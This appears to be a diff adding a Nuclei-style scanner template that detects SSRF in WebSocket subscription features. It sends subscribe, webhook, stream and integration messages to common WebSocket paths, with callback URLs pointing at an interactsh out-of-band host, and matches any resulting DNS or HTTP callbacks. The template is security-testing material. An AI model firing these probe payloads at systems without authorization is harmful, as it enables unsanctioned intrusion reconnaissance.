@@ -1,0 +1,115 @@
+id: websocket-subscription-oob
+info:
+  author: geeknik
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 5.5
+    cwe-id: CWE-918
+  description: 'Detects WebSocket endpoints that support event subscriptions with
+    external callback URLs,
+
+    potentially leading to SSRF through subscription webhooks, event notifications,
+    or
+
+    real-time data streaming to external endpoints.
+
+    '
+  name: WebSocket Subscription Callback OOB Detection
+  reference:
+  - https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API
+  - https://socket.io/docs/v4/
+  - https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking
+  severity: medium
+  tags: websocket,oob,ssrf,subscription,callback,events
+variables:
+  callback_url: '{{interactsh-url}}'
+  ws_base: '{{replace(replace(BaseURL, ''https://'', ''wss://''), ''http://'', ''ws://'')}}'
+websocket:
+- address: '{{ws_base}}{{ws_path}}'
+  inputs:
+  - data: "{\n  \"type\": \"subscribe\",\n  \"event\": \"user.update\",\n  \"callback_url\"\
+      : \"{{callback_url}}/webhook\",\n  \"webhook\": \"{{callback_url}}/events\"\n\
+      }\n"
+  - data: "{\n  \"action\": \"notification_config\",\n  \"config\": {\n    \"endpoint\"\
+      : \"{{callback_url}}/notify\",\n    \"events\": [\"message\", \"connect\", \"\
+      disconnect\"],\n    \"format\": \"json\"\n  }\n}\n"
+  - data: "{\n  \"command\": \"webhook_setup\",\n  \"webhook_url\": \"{{callback_url}}/callback\"\
+      ,\n  \"events\": [\"*\"],\n  \"retry_failed\": true,\n  \"external_webhook\"\
+      : \"{{callback_url}}/external\"\n}\n"
+  matchers:
+  - condition: or
+    part: interactsh_protocol
+    type: word
+    words:
+    - http
+    - dns
+  - condition: or
+    part: interactsh_request
+    type: word
+    words:
+    - webhook
+    - events
+    - notify
+    - callback
+    - external
+  matchers-condition: and
+  payloads:
+    ws_path:
+    - /ws
+    - /websocket
+    - /socket.io/
+    - /api/ws
+    - /realtime
+- address: '{{ws_base}}{{ws_path}}'
+  inputs:
+  - data: "{\n  \"type\": \"stream_config\",\n  \"destination\": \"{{callback_url}}/stream\"\
+      ,\n  \"format\": \"json\",\n  \"real_time\": true,\n  \"callback_on_error\"\
+      : \"{{callback_url}}/error\"\n}\n"
+  matchers:
+  - condition: or
+    part: interactsh_protocol
+    type: word
+    words:
+    - http
+    - dns
+  - condition: or
+    part: interactsh_request
+    type: word
+    words:
+    - stream
+    - error
+  matchers-condition: and
+  payloads:
+    ws_path:
+    - /ws/stream
+    - /websocket/feed
+    - /api/ws/live
+- address: '{{ws_base}}{{ws_path}}'
+  inputs:
+  - data: "{\n  \"type\": \"integration\",\n  \"integration\": {\n    \"type\": \"\
+      webhook\",\n    \"url\": \"{{callback_url}}/integration\",\n    \"auth_callback\"\
+      : \"{{callback_url}}/auth\",\n    \"data_endpoint\": \"{{callback_url}}/data\"\
+      \n  }\n}\n"
+  - data: "{\n  \"action\": \"external_subscription\",\n  \"external_url\": \"{{callback_url}}/subscribe\"\
+      ,\n  \"callback_events\": [\"all\"]\n}\n"
+  matchers:
+  - condition: or
+    part: interactsh_protocol
+    type: word
+    words:
+    - http
+    - dns
+  - condition: or
+    part: interactsh_request
+    type: word
+    words:
+    - integration
+    - auth
+    - data
+    - subscribe
+  matchers-condition: and
+  payloads:
+    ws_path:
+    - /ws/integration
+    - /websocket/external
+    - /api/ws/third-party
